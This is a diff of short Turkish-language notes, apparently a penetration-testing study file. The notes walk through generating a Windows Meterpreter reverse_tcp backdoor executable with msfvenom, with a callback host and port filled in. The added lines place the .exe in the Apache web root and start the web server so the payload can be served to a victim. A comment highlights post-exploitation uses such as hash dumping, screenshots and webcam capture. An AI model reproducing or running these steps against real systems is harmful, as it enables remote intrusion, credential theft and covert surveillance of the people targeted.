@@ -18,4 +18,10 @@
 
 > msfvenom -payload windows/meterpreter/reverse_tcp --list options // ayarlar çıkar, zorunlu olanlar değiştirilir , meterpreter kullanma sebebi çok güçlü post-exploitation özellikleri var.hashdump,screenshot,webcam_snap.. -tcp http https denenir. hangisi olursa
 
-> msfvenom -payload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 --format exe --out mybackdoor.exe //localhost ip adresin,port genelde8080 web , format tipi dosyanın .exe
+> msfvenom -payload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 --format exe --out mybackdoor.exe //localhost ip adresin,port genelde8080 web , format tipi dosyanın .exe // .exe dosyası oluşturulur
+
+-
+
+~File > var > www > html // buraya .exe dosyasını yapıştır
+
+> service apache2 start // Makinen web sunucusu olur. Cihazın ip sine gidildiğinde web sitesi karşılar.
